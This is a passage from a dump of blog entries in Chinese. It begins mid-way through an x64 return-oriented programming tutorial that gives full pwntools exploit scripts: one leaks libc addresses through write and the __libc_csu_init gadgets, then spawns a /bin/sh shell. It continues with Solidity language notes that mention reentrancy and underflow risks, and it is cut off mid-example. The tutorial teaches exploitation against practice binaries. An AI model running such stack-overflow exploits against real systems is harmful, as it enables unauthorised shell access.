&emsp;&emsp;但同时考虑到我们只需要执行system一次，所以似乎gadgets不含有ret也可以，那么我们的选择又多了一些： 123456ROPgadget --binary libc.so.6 --only "pop|call"====================================================0x00000000000bad0d : call qword ptr [rdi]0x0000000000027225 : call rdi0x00000000000f982b : pop rax ; pop rdi ; call rax0x00000000000f982c : pop rdi ; call rax &emsp;&emsp;这时候我们看到了 0x00f982b : pop rax ; pop rdi ; call rax 这行指令应该也是可以的，我们只需要构造payload如下： 1payload = 'a' * 0x80 + 'b' * 8 + p64(pop_pop_call) + p64(system_addr) + p64(bin_sh) &emsp;&emsp;此时system_addr被传入rax，bin_sh被传入rdi，最后调用call rax实现exploit，所以两条ROP都可以完成一次优雅的攻击，最终的exp如下： 1234567891011121314151617181920212223242526272829303132from pwn import *sh = process('./rop_libc')libc = ELF('./libc.so')vuln_addr = 0x000011dbsystem_addr_str = sh.recvuntil("\n")system_addr = int(system_addr_str,16)print "system_addr= " + hex(system_addr)pop_pop_call_offset = 0x00000000000f982b - libc.symbols['system']print "pop_offset= " + hex(pop_pop_call_offset)bin_sh_offset = 0x0000000000181519 - libc.symbols['system'] # libc.search('/bin/sh').next()print "bin_sh_offset= " + hex(bin_sh_offset)pop_pop_call_addr = system_addr + pop_pop_call_offsetprint "pop_addr= " + hex(pop_pop_call_addr)#pop_pop_call_addr = system_addr + pop_pop_call_offset#print "pop_pop_call_addr = " + hex(pop_pop_call_addr)bin_sh = system_addr + bin_sh_offsetprint "bin_sh= " + hex(bin_sh)payload = 'a'*0x88 + p64(pop_pop_call_addr) + p64(system_addr) + p64(bin_sh)#payload = "a" * 0x80 + 'b' * '8' + p64(pop_ret_addr) + p64(bin_sh) + p64(system_addr)sh.sendline(payload) sh.interactive() 2.通用gadgets&emsp;&emsp;假如我们出现了更艰难的情况，我们需要传入更多的参数进去，比如write(),这时候要怎么办？我们查一下libc.so发现什么都没有，有点难受：123456789101112131415160x0000000000106ab4 : pop r10 ; ret0x0000000000024568 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret0x0000000000023a58 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000006f529 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret0x000000000002fc29 : pop r12 ; pop r13 ; pop r14 ; ret0x00000000000396f5 : pop r12 ; pop r13 ; pop rbp ; ret0x0000000000023f85 : pop r12 ; pop r13 ; ret0x00000000000b5399 : pop r12 ; pop r14 ; ret0x00000000000c513d : pop r12 ; pop rbp ; ret0x0000000000024209 : pop r12 ; ret0x000000000002456a : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret0x0000000000023a5a : pop r13 ; pop r14 ; pop r15 ; ret0x000000000006f52b : pop r13 ; pop r14 ; pop rbp ; ret0x000000000002fc2b : pop r13 ; pop r14 ; ret0x00000000000396f7 : pop r13 ; pop rbp ; ret0x0000000000023f87 : pop r13 ; ret &emsp;&emsp;不太全但是可以发现几乎没有关于rdi等等有关参数的寄存器，这个时候我们就要采取一些骚办法. __libc_csu_init &emsp;&emsp;这个函数在大部分程序初始化的时候都会出现，我们首先来看一下这个函数的源码： 123456789101112131415161718192021222324252627282930313233objdump -d rop_libc====================================================0000000000001240 &lt;__libc_csu_init&gt;: 1240: 41 57 push %r15 1242: 49 89 d7 mov %rdx,%r15 1245: 41 56 push %r14 1247: 49 89 f6 mov %rsi,%r14 124a: 41 55 push %r13 124c: 41 89 fd mov %edi,%r13d 124f: 41 54 push %r12 1251: 4c 8d 25 80 2b 00 00 lea 0x2b80(%rip),%r12 # 3dd8 &lt;__frame_dummy_init_array_entry&gt; .......... #以下是关键 #gadget2 1278: 4c 89 fa mov %r15,%rdx 127b: 4c 89 f6 mov %r14,%rsi 127e: 44 89 ef mov %r13d,%edi 1281: 41 ff 14 dc callq *(%r12,%rbx,8) 1285: 48 83 c3 01 add $0x1,%rbx 1289: 48 39 dd cmp %rbx,%rbp 128c: 75 ea jne 1278 &lt;__libc_csu_init+0x38&gt; 128e: 48 83 c4 08 add $0x8,%rsp #gadget1 1292: 5b pop %rbx 1293: 5d pop %rbp 1294: 41 5c pop %r12 1296: 41 5d pop %r13 1298: 41 5e pop %r14 129a: 41 5f pop %r15 129c: c3 retq #此处构造一些padding(7*8=56byte)就可以返回了 &emsp;&emsp;首先我们来看一下gadgets1，pop了一堆东西进到寄存器里，然后控制ret到gadget2,此时我们便可以看出其中的玄机，gadget1中pop进寄存器的值竟然被传进了我们梦寐以求的rdi rsi rdx 三个参数寄存器，然后接下来 callq *(%r12,%rbx,8) 会调用 [$r12 + rbx*8] 处的函数,之后进行 rbx += 1,然后比较rbx与rbp的值，如果想等那么就继续向下进行，并且ret到我们想要继续执行的位置。到这，我就可以开始思考如何给gadget1传参数了，反复思索后： 1234567$rbx = 0$rbp = 1$r12 = callee function$r13 = arg1 $r14 = arg2 $r15 = arg3 这里需要注意的是需要构造56个padding，因为进行了6次pop和一次ret，使得rsp增大了56bytes。 &emsp;&emsp;这个时候我们精心设计的rop链就可以执行传递多个参数的复杂操作了。 &emsp;&emsp;下面我们来看一道题： 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, "Hello, World\n", 13); vulnerable_function();&#125; &emsp;&emsp;乍一看除了write()和read()啥也没有，可以想到应该是libc泄漏，搜了一波发现没啥好用的gadgets，行吧，__libc_csu_init走起。由于write()函数被调用过，所以我们考虑根据write()来计算偏移： &emsp;&emsp;我们先构造payload1,利用write()函数来泄漏write自己在内存里的位置，然后返回到程序里，继续覆盖栈上的数据，直到回到main函数来继续进行后续操作：123#get the address of writepayload1 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)payload1 += p64(0x4011c8) + 'd' * 56 + p64(main) &emsp;&emsp;当我们收到write的地址后，我们便能够计算出system()在内存中的地址了。我们便构造payload2使用read()函数来将算出的system()与/bin/sh写入bss段： 12#get the address of system and bin_shpayload2 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(read_got) + p64(1) + p64(bss) + p64(16) + p64(0x4011c8) + 'd'*56 + p64(main) 最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。 12#activate the system("/bin/sh")payload3 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(bss) + p64(bss+8) + p64(0x4011c8) + 'd' *56 + p64(main) &emsp;&emsp;最终的exp如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from pwn import *#r12 = ret_addr#r13 = rdi = arg1 r14 = rsi = arg2 r15 = rdx = arg3#rbx = 0 rbp = 1sh = process('./rop_libc1')elf = ELF('./rop_libc1')libc = ELF('./libc.so')main = 0x401153bss = 0x00000008read_got = 0x404020write_got = elf.got['write']print "write_got= " + hex(write_got)write_libc = libc.symbols['write']print "write_libc= " + hex(write_libc)system_libc = libc.symbols['system']print "system_libc= " + hex(system_libc)bin_sh_libc = libc.search('/bin/sh').next()print "bin_sh_libc= " + hex(bin_sh_libc)#get the address of writepayload1 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)payload1 += p64(0x4011c8) + 'd' * 56 + p64(main)sh.recvuntil("Hello, World\n")sh.sendline(payload1)sleep(0.5)write_addr = u64(sh.recv(8))print "write_addr= " + hex(write_addr)sleep(0.5)#get the address of system and bin_shpayload2 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(read_got) + p64(1) + p64(bss) + p64(16) + p64(0x4011c8) + 'd'*56 + p64(main)sh.sendline(payload2)sh.send(p64(system_libc + write_addr - write_libc))sh.send("/bin/sh\0")sleep(0.5)sh.recvuntil("Hello, World\n")#activate the system("/bin/sh")payload3 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(bss) + p64(bss+8) + p64(0x4011c8) + 'd' *56 + p64(main)sh.sendline(payload3)sh.interactive() &emsp;&emsp;至此，一个华丽的利用已经完成了. 以上是对x64libc泄漏的处理方式 书山又路勤为径,学海无涯苦做舟]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[solidity文档整理]]></title>
    <url>%2F2019%2F03%2F28%2Fsolidity%E6%96%87%E6%A1%A3%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[文档整理 1. 合约的结构 状态变量(State Variable) &emsp;&emsp;状态变量指的是那些直接声明在函数外的变量，他们被永久的储存在合约里。 12345pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract SimpleStorage&#123; uint storedData; //State variable&#125; 函数(Function) &emsp;&emsp;solidity里的函数与Javascript极为相似，但是包含更多的修饰词和可见性限制,也可以有多个返回值。 函数修改器(Function Modifier) &emsp;&emsp;函数修改器主要是以声明的形式来修改函数的语义，比如给函数的出发增加限制条件或者验证。 12345678910111213pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract Purchase&#123; address public seller; modifier onlySeller() &#123; require(msg.sender == seller,"only seller can call this"); -; &#125; function abort() public view onlySeller&#123; // Modidier usage // ... &#125;&#125; 事件(Event) &emsp;&emsp;事件是EVM logging的便利接口。当事件被触发时，可将部分数据记录到区块链上。 12345678910pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract SimpleAuction&#123; event HighestBidIncreased(address bidder, uint amount); //Event function bid() public payable&#123; // ... emit HighestBidIncreased(msg.sender,msg.value); //Triggering event &#125;&#125; 结构(Struct) &emsp;&emsp;结构体与c语言极为相似 12345678910pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract Ballot&#123; struct Voter&#123; // Struct uint weight; bool voted; address delegate; uint vote; &#125;&#125; 枚举(Enum) &emsp;&emsp;枚举与C++中的枚举类似，都是自定义类型，你可以认为这是一个常量集合。 1234567pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract Purchase &#123; enum State &#123; Created, Locked, Inactive //Enum &#125;&#125; 2. 数据类型 布尔(Booleans) &emsp;&emsp;与通常的语言一样，bool 包含 true 和 false 两种常量。 Operators: ! 非 &amp;&amp; 与 || 或 == 等于 != 不等于 || 和 &amp;&amp; 遵守短路定律，这意味着表达式 1f(x) || g(y) &emsp;&emsp;如果f(x)为真，g(y)将不参与运算，尽管这可能有副作用。 整数(Integers) &emsp;&emsp;int / uint 分别是有符号和无符号整数，他们具有可变的内存体积。关键字uint8到uint256与int8到uint8相对应。数字后缀代表的是变量的内存大小，uint8指的是8bits的无符号整数。并且uint与int是uint256与int256的别名(alias)。 Operator: 比较： &lt;= , &lt; , == , != , &gt;= , &gt; (表达式的值为bool) 位运算： &amp; , | , ^ , ~ 移位运算： &lt;&lt; , &gt;&gt; 算数运算： + , - , * , / 整数的大小范围在solidity中十分严格，例如uint32代表0到2**32 - 1之间的数，如果结果超出这个范围，那么可能造成上溢或者下溢，这可能会给合约造成严重的安全隐患。 地址(Address) &emsp;&emsp;地址类型是较为特殊的变量类型，这中变量对应一个合约或者账户(本质上合约就是一个账户)，他主要包含两种风格： address: 包含20byte的值 （以太坊地址）address payable: 与address一样，但是包含transfer和send两个成员 &emsp;&emsp;两者的主要区别是，后者可以就收以太币(Ether)，但是address却不能，这里一定要注意，尤其是在写攻击合约的时候。 &emsp;&emsp;address payable 到 address的隐式转换是允许的，但是反过来却不行，地址字面量能够被隐式的转换为address payable &emsp;&emsp;int 整数字面量(integer literals) bytes20以及合约 类型都可以被被显式的转换为address类型。 int 字面量 和bytes20 想要转换为address payable必须满足地址本身代表的合约或者账户的fallback(回滚)函数必须是payable的。当然，如果address变量的fallback函数是payable的，那么显式的转换也是可以的。 warning: 如果你想要将一个大的bytes类型转换为地址，比如bytes32,这个时候address会截尾，为了避免二义性，你必须显式的自行进行截断的选择。 12345b = 0x111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFCCCC;address(uint160(bytes20(b))) //这时结果为0x111122223333444455556666777788889999aAaaaddress(uint169(uint256(b))) //这时结果为0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc 地址的成员(Members of Address) &emsp;&emsp;上面提到balance和transfer是address payable类型的两个成员。 &emsp;&emsp;如果地址是payable的，那么我们可以查询地址剩余的Ether或者向他打钱，例如： 123456address payable x = address(0x123);address myAddress = address(this);if(x.balance &lt; 10 &amp;&amp; myAddress.balance &gt;= 10)&#123; x.transfer(10); &#125; &emsp;&emsp;这个时候我们就向x地址打了10块钱，balance实际上是调用了成员对象本身的getter()函数，getter能够返回一个状态变量的值。 transfer函数将会在ether不足或者对方拒绝收钱时执行失败，这个时候transfer()将会回滚，注意这里很重要，有转账功能的还有send()函数和.call.value()()函数，后两者在失败时转出的钱不会回滚，这就有可能导致Reentrancy漏洞。 函数 处理 消耗 .transfer() 失败时抛出异常，并且回滚状态 消耗2300 Gas (not adjustable) 可防止回滚 .send() 失败时返回错误 消耗2300 Gas (not adjustable) 不防止回滚 .call.value().gas()() 失败时返回错误 消耗Gas可调节 不防止回滚 .send()与.call.value()()函数在转账过程中发生异常时，不能有效回滚，导致Reentrancy的攻击无法防御，因此我们在交易时应当使用transfer()函数。 关于call() delegatecall() staticcall()为了不依赖于ABI来调用合约的接口，或者更为直接的调用其他合约的方法，solidity提供了call，delegatecall，staticcall。他们都接受一个bytes memory类型的参数，并且返回bool类型和被调用方法的返回值。方法abi.encode,abi.encodePacked,abi.encodeWithSelector以及abi.encodeWithSignature 可以被用来将数据编码结构化。 12345bytes memory payload = abi.encodeWithSignature("register(string)","MyName");(bool success, bytes memory returnData) = address(nameReg).call(payload);require(success); 关于call()与delegatecall()的区别：&emsp;&emsp;这里要强调一下call与delegatecall可能导致的问题，两者都是底层调用，但是两者的上下文不同，call所代表的上下文是被调用合约实例本身，而delegatecall则是该方法调用的发起者。 &emsp;&emsp;因此这时候我们应当注意状态的转换，尽量少的使用底层调用。 注：作为底层调用，如果你调用了任何未知的恶意合约，相当于你将控制权交给了他，这有可能导致该恶意合约回调你的合约，所以你的合约状态变量可能会被恶意修改。通常情况下我们应当创建一个合约实例,如: x.f() &emsp;&emsp;call()的用法实例： 通过gas()函数修改器来调整Gas 1address(nameReg).call.gas(1000000)(abi.encodeWithSignature("register(string)", "MyName")); 通过value()函数修改器来调整Ether： 1address(nameReg).call.value(1 ether)(abi.encodeWithSignature)("register(string)","MyName"); 这两种函数修改器可以结合： 1address(nameReg).call.gas(1000000).value(1 ether)(abi.encodeWithSignature("register(string)", "MyName")); &emsp;&emsp;类似地，函数delegatecall也可以被如此调用，区别是：此函数只使用给定地址的代码，其他方面比如(storage,balance…)都是当前调用合约，这一点上面我们说过了。使用delegatecall的目的主要是使用其他合约的library中的方法。但是用户需要确定两合约的内存布局适合是的。 &emsp;&emsp;对于staticcall，他与call十分相似，但这个方法会revert(恢复调用前状态)如果被调用方法修改了状态变量。 delegatecall()不支持value()修改器 所有的合约都能被显式转换为地址，因此可以使用address(this).balance来查看当前合约的存款。 合约类型(Contract) &emsp;&emsp;与C++类似，每种合约都是一种数据类型，子类合约可以隐式的转换为父类或超类合约，并且能够显式的转换为address类型。 &emsp;&emsp;与address类似，只有fallback函数是payable的合约才能转化为address payable。转换的方式依旧是address(contract) 而不是 address payable(contract). &emsp;&emsp;你可以声明一个合约类型的局部变量，那么你就可以调用那个合约的方法，如： 12345678910111213contract A &#123; uint x; contrusctor(uint a) internal&#123; x = a; &#125;&#125;contract B &#123; A a = A(2); //调用了A的构造函数 function echoA() public view returns(uint)&#123; return a.x(); //返回a.x的值 &#125;&#125; &emsp;&emsp;但是假如你想要调用已经存在的一个实例，比如想要攻击已经在链上的一个合约，这个时候你可以： 123456789contract Fuck &#123; address target_contract_addr = "0x123"; //首先获得攻击目标的地址 TargetContract x = TargetContract(target_contract_addr); //将地址注入构造函数 x.balance(); //进行你想做的攻击 //...&#125; 你可以用type(c)来获得c合约的类型。 定长数组(Fixed-size byte arrays) &emsp;&emsp;bytes1到bytes32能储存一列数，数组长度是从1到32，byte是byte1的alias。 Operator： 比较 &lt;= , &lt; , == , != , &gt;= , &gt; 结果返回bool 位运算： &amp; , | , ^ , ~ 移位运算： &lt;&lt; , &gt;&gt; 寻址运算： x[k] 获得数组x的第i+1个数据 成员对象.length是只读的，不可修改 变长数组(Dynamically-sized byte array) &emsp;&emsp;bytes是动态大小的数组，不是值类型。&emsp;&emsp;string是UTF-8-encode 的string类型，不是值类型。 字面量(Literals) &emsp;&emsp;字面量包括地址字面量(Address Literals)，字符串字面量(String Literals)和有理字面量(Rational Literals)以及整数字面量(Interege Literals),通俗来讲字面量就是常数，而且其精度无限(与其本身长度有关)，但是当字面两转化为非字面量时，精度可能会损失。 5/2对于字面量来说是2.5，而对于uint来说是2。字面量参与非字面量进行运算时，其类型必须相同，如: 123uint128 a = 1;uint128 b = 2.5 + a; //这样写是会报错的 函数(Function) &emsp;&emsp;函数的用法与js极为相似，只是有些可见性关键字需要解释一下，首先来看一下声明格式： 1function (&lt;parameter types&gt;) &#123;internal|external&#125; [pure|view|payable] [&lt;returns types&gt;] &emsp;&emsp;函数中假如有返回值，则返回值的类型不能省略，如果返回值缺省，那么整个returns()的部分都应该省略。 &emsp;&emsp;默认情况下函数的可见性是internal，但是我自己在尝试时发现，如果可见性关键字缺省则会导致报错。 &emsp;&emsp;下面我们来解释一下可见性与访问控制的问题： &emsp;&emsp;函数的可见性分为四种：public private internal external . internal&emsp;&emsp;internal调用，实现时转为简单的EVM跳转，所以他能够直接访问上下文的数据，对于引用传递是十分高效，例如memory之间的值传递，实际上是引用的传递(妈耶，storage和memory又是坑，不同版本真是令人窒息)。 &emsp;&emsp;当前代码单元内，比如同一个合约内的函数，引入的library库，以及父类函数的直接调用即为internal调用，比如： 123456789pragma solidity &gt;=0.4.0 &lt; 0.6.0;contract test&#123; function a() internal &#123;&#125; function b() internal &#123; a(); &#125;&#125; &emsp;&emsp;在上述代码中的b()对a()的调用即为internal方式调用，函数在不显式声明访问类型时,以目前的版本来看会报错。 external&emsp;&emsp;external调用实现了合约的外部消息调用。所以合约在初始化时不能以external的方式调用自身函数，因为此时合约仍未构造完成，此处可类比struct类型，一个结构体不能包含自身对象。但是可以以this的方式强制进行external调用。 1234567891011121314pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract test&#123; function a() external &#123;&#125; function b() public &#123; a(); //此时会报错 &#125; contract ext&#123; function callA(test tmp) public &#123; tmp.a(); &#125; &#125;&#125; public&emsp;&emsp;public的特点是，函数既可以以internal方式调用，也可以用internal方式调用。public函数可以被外部接口访问，是合约对外接口的一部分。12345678910pragma solidity &gt;= 0.4.0 &lt; 0.6.0contract test&#123; function fun1() public&#123;&#125; funciton fun2() public &#123; fun1(); this.fun2(); &#125;&#125; &emsp;&emsp;可以看到没有报错，既然public这么舒服，那为啥我还要用external？？？ &emsp;&emsp;经过对比后我们可以发现，external方法消耗的gas要比public少，因为Solidity在调用public函数时会将代码复制到EVM的内存中，而external则是以calldata的方式进行调用的。内存分配在EVM中是十分宝贵的，而读取calldata则十分廉价，因此在处理大量外部数据，并反复调用函数时，应当考虑用external方法。 &emsp;&emsp;这里应当注意的是，public属于可见性。函数的可见性分为四种：public private internal external . private&emsp;&emsp;对于private，与internal的区别是，private的方法在子类中无法调用，即使被声明为private也不能阻止数据的查看。访问权限仅仅是限制其他合约对函数的访问和数据修改的权限。而private方法也默认以internal的方式调用。 12345678910111213141516171819pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract test&#123; function fun1() private&#123;&#125; function fun2() public&#123; fun1(); //this.fun1() &#125;&#125;//合约的继承为is，这一点很容易理解，如果你明白设计模式的话，实际上继承是A is B 的关系,我很喜欢这种写法。contract ext is test&#123; function callFun() public &#123; //fun1(); fun2(); &#125;&#125; &emsp;&emsp;这里我们可以明确的看到private的效果，和internal类似，但是代价会更大。 &emsp;&emsp;然而 public 与 private 还可以被作用于其他的变量，用于设置外部访问权限。 &emsp;&emsp;请大家务必不要弄混 调用方式 与 可见性(visable) 。 关于 view pure constant &emsp;&emsp;在0.4.1之前只有constant这一种可爱的语法，就是有一些屁事很多的人觉得constant指的是变量，作用于函数不太合适，所以就把constant拆成了view和pure。 &emsp;&emsp;在Solidity中，constant view pure 的作用是告诉编译器，函数 不改变，不读取状态变量，这样一来函数的执行就不再消耗gas了，因为不再需要矿工去验证。 &emsp;&emsp;然而这三个东西有点有意思，在官方文档中用 restrictive 这一词来对函数的严格性进行描述，在函数类型转换时对严格行有一定的要求，高严格性函数可以被转化为低严格性函数： pure 类型可被转化为 view 和 non-payable 函数 view 类型可被转化为 non-payable 函数 payable 类型可被转化为 non-payable 函数 Member: selector 返回ABI函数选择器。 gas(uint) 返回一个函数对象，当被调用时将会发送具体数目的Gas给目标函数。 value(uint)返回一个函数对象了，当被调用时将会发送具体的wei给目标函数，或者使用value(1 ether)的方式来发送以太币。 &emsp;&emsp;我们来看一下用法示例： 12345678910pragma solidity &gt;=0.4.16 &lt;0.6.0;contract Example &#123; function f() public payable returns (bytes4) &#123; return this.f.selector; &#125; function g() public &#123; this.f.gas(10).value(800)(); &#125;&#125; &emsp;&emsp;下面是internal关键字的用法示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748pragma solidity &gt;=0.4.16 &lt;0.6.0;library ArrayUtils &#123; // internal functions can be used in internal library functions because // they will be part of the same code context function map(uint[] memory self, function (uint) pure returns (uint) f) internal pure returns (uint[] memory r) &#123; r = new uint[](self.length); for (uint i = 0; i &lt; self.length; i++) &#123; r[i] = f(self[i]); &#125; &#125; function reduce( uint[] memory self, function (uint, uint) pure returns (uint) f ) internal pure returns (uint r) &#123; r = self[0]; for (uint i = 1; i &lt; self.length; i++) &#123; r = f(r, self[i]); &#125; &#125; function range(uint length) internal pure returns (uint[] memory r) &#123; r = new uint[](length); for (uint i = 0; i &lt; r.length; i++) &#123; r[i] = i; &#125; &#125;&#125;contract Pyramid &#123; using ArrayUtils for *; function pyramid(uint l) public pure returns (uint) &#123; return ArrayUtils.range(l).map(square).reduce(sum); &#125; function square(uint x) internal pure returns (uint) &#123; return x * x; &#125; function sum(uint x, uint y) internal pure returns (uint) &#123; return x + y; &#125;&#125; &emsp;&emsp;接下来是external关键字的用法： 123456789101112131415161718192021222324252627282930313233pragma solidity &gt;=0.4.22 &lt;0.6.0;contract Oracle &#123; struct Request &#123; bytes data; function(uint) external callback; &#125; Request[] requests; event NewRequest(uint); function query(bytes memory data, function(uint) external callback) public &#123; requests.push(Request(data, callback)); emit NewRequest(requests.length - 1); &#125; function reply(uint requestID, uint response) public &#123; // Here goes the check that the reply comes from a trusted source requests[requestID].callback(response); &#125;&#125;contract OracleUser &#123; Oracle constant oracle = Oracle(0x1234567); // known contract uint exchangeRate; function buySomething() public &#123; oracle.query("USD", this.oracleResponse); &#125; function oracleResponse(uint response) public &#123; require( msg.sender == address(oracle), "Only oracle can call this." ); exchangeRate = response; &#125;&#125; Lambda(匿名)和inline(内联)函数暂时不支持，在后续版本即将推出。 引用类型(Reference Type) &emsp;&emsp;引用与C++中的引用类似，即一个量可以通过多个别名修改，与值类型相比较，后者可以直接得到一个拷贝对象。因此，在使用引用类型时应当格外小心。目前，引用类型包括结构，数组和映射。如果你使用一个引用类型，你必须显式的声明他的储存位置： memory 生命周期为一个函数调用，只在EVM内存中存在storage 生命周期无限，与状态变量一起储存在区块链上calldata 包含函数参数的特殊数据位置，仅可用于external函数调用参数 &emsp;&emsp;更改Data Location的赋值或类型转换将会引发自动复制操作，若两者的Data Location类型相同，那么只在两者均为storage的某些情况下才会引发复制临时对象。 数据位置(Data Location)&emsp;&emsp;如上面提到，引用类型必须显式的添加”data location”的声明，即memory storage calldata.&emsp;&emsp;Calldata只对external函数的参数有效，并且对于此类型的参数是必须的。Calldata类型的变量的存储位置是不可修改的，非持久的储存函数参数的区域，行为与memory十分类似。 内存区域和分配行为&emsp;&emsp;数据位置不仅与数据的持久性有关，还与赋值的语义有关： 当赋值行为在memory(或者calldata)与storage之间时，会直接创造一个拷贝对象 当赋值行为是memory与memory时，仅仅创造一个引用，这意味着如果修改其中一个memory变量，将会导致所指向的同一位置的内存数据的修改(与C语言的指针类似) 当storage赋值给local storage(函数中的storage)之间时，此时也仅仅分配一个引用 其他所有赋值给storage或状态变量的操作都会创造一个拷贝对象，即使给storage的局部变量仅仅是个引用。下面的例子展现了这几种特性： 12345678910111213141516171819202122232425pragma solidity &gt;=0.4.0 &lt;0.6.0;contract C &#123; uint[] x; // the data location of x is storage // the data location of memoryArray is memory function f(uint[] memory memoryArray) public &#123; x = memoryArray; // works, copies the whole array to storage uint[] storage y = x; // works, assigns a pointer, data location of y is storage y[7]; // fine, returns the 8th element y.length = 2; // fine, modifies x through y delete x; // fine, clears the array, also modifies y // The following does not work; it would need to create a new temporary / // unnamed array in storage, but storage is "statically" allocated: // y = memoryArray; // This does not work either, since it would "reset" the pointer, but there // is no sensible location it could point to. // delete y; g(x); // calls g, handing over a reference to x h(x); // calls h and creates an independent, temporary copy in memory &#125; function g(uint[] storage) internal pure &#123;&#125; function h(uint[] memory) public pure &#123;&#125;&#125; 数组(Array) &emsp;&emsp;数组的用法上面介绍的都差不多了，这里需要注意的是solidity中的数组的声明方式与通常的语言不同，他的第一个下标是一个数组的位置，第二个下标是数组中元素的位置： 12345uint[][5] x memory; //一个由5个储存uint类型的动态数组被写入数组x 这种方式与其他语言相反X[2][1]; //代表第三个数组的第二个元素T[5] a; //T本身可以是个数组，那么a[2]就代表T类型的变量 &emsp;&emsp;数组元素可以是任意类型，包括映射(mapping)与结构(struct)类型。但是通常情况下这种使用有限制，因为mapping与struct必须存储在storage数据区域内。 &emsp;&emsp;将状态变量数组声明为public是可行的，并且solidity将会为其创建一个getter接口。那么数组的数字索引将会是getter()的参数。 &emsp;&emsp;当数组寻址且超过其长度范围时，将会导致一个失败断言(failing assertion).你可以使用.push()与.pop()函数来向末尾增加或弹出元素(与C++的STL类似)，也可以直接修改.length成员来修改数组的长度。 关于bytes与string &emsp;&emsp;bytes与string是特殊测数组，bytes与byte[]类似，但是他在calldata与memory存储区域内将会被打包的更紧致。string与bytes的区别是，string不能访问.length也不能进行寻址操作。 &emsp;&emsp;solidity没有字符串操作函数，但有第三方字符串库。还可以使用keccak256-hash函数来比较两个字符串： 1keccak256(abi.encodePacked(s1)) == keccak256(abi.encodePacked(s2)) &emsp;&emsp;并通过abi.encodePacked(s1, s2)来连接两个字符串。 &emsp;&emsp;你应当尽量的使用bytes而不是bytes[]，因为bytes[]在两个元素之间增加了31个填充字节。作为一般规则，对任意长度的原始byte数据使用bytes，对任意长度字符串（UTF-8）数据使用string。 加入你一定要对string对象进行.length或者寻址操作，那么你应当先把他强制转换为bytes类型，如： 12345string s;uint len = bytes(s).length;bytes(s)[7] = 'x'; 为数组分配内存&emsp;&emsp;为数组分配内存与C++类似，要使用new关键字在内存中创建运行时确定长度的数组,如： 1234567891011pragma solidity &gt;=0.4.16 &lt;0.6.0;contract C &#123; function f(uint len) public pure &#123; uint[] memory a = new uint[](7); bytes memory b = new bytes(len); assert(a.length == 7); assert(b.length == len); a[6] = 8; &#125;&#125; 数组成员Length: 数组的length成员包含了数组元素的个数，这个长度在内存中一旦确定是不可变的(不包括动态数组)，对于动态数组，给length重新赋值能够修改其长度。当寻址超出长度之外时，你将会引发一个失败断言。新增加的长度的值被初始化为0,你可以通过delete关键字删除单个的元素来减少数组的长度。如果你尝试改变一个非动态数组的length，你会得到一个Value must be an lvalue错误。 push:&emsp;&emsp;动态数组以及bytes与string拥有push()成员函数，你可以使用push来向数组末尾添加一个元素，若参数为空则默认为0,该函数返回新的数组长度。 pop:&emsp;&emsp;动态数组以及bytes与string拥有pop()成员函数，你可以使用pop来删除数组末尾的最后一个元素。 注意： 这里一定要注意动态数组的下溢问题(underflow)，假如你对一个空数组进行&lt;d-array&gt;.length--操作，那么这将会导致数组的长度变为2**256 - 1,这意味着你将可以访问内存中的任意变量，也可能导致某些逻辑判断的步骤出错。 &emsp;&emsp;增加数组的长度将会消耗固定的Gas，因为新增的元素被初始化为0,当减少长度时则消耗线性的Gas(但通常情况下要比线性糟糕)， 因为包含了显式的删除与清理元素的步骤，即调用delete关键字。 目前还不能在external函数中使用数组的数组，但是在public函数中是支持的。 在拜占庭(Byzantium)之前的EVM版本中，无法访问函数调用返回的动态数组。如果调用返回动态数组的函数，请确保使用设置为拜占庭模式的EVM。关于拜占庭请参考白皮书中的拜占庭将军问题，很有意思。 &emsp;&emsp;数组用法实例如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485pragma solidity &gt;=0.4.16 &lt;0.6.0;contract ArrayContract &#123; uint[2**20] m_aLotOfIntegers; // Note that the following is not a pair of dynamic arrays but a // dynamic array of pairs (i.e. of fixed size arrays of length two). // Because of that, T[] is always a dynamic array of T, even if T // itself is an array. // Data location for all state variables is storage. bool[2][] m_pairsOfFlags; // newPairs is stored in memory - the only possibility // for public contract function arguments function setAllFlagPairs(bool[2][] memory newPairs) public &#123; // assignment to a storage array performs a copy of ``newPairs`` and // replaces the complete array ``m_pairsOfFlags``. m_pairsOfFlags = newPairs; &#125; struct StructType &#123; uint[] contents; uint moreInfo; &#125; StructType s; function f(uint[] memory c) public &#123; // stores a reference to ``s`` in ``g`` StructType storage g = s; // also changes ``s.moreInfo``. g.moreInfo = 2; // assigns a copy because ``g.contents`` // is not a local variable, but a member of // a local variable. g.contents = c; &#125; function setFlagPair(uint index, bool flagA, bool flagB) public &#123; // access 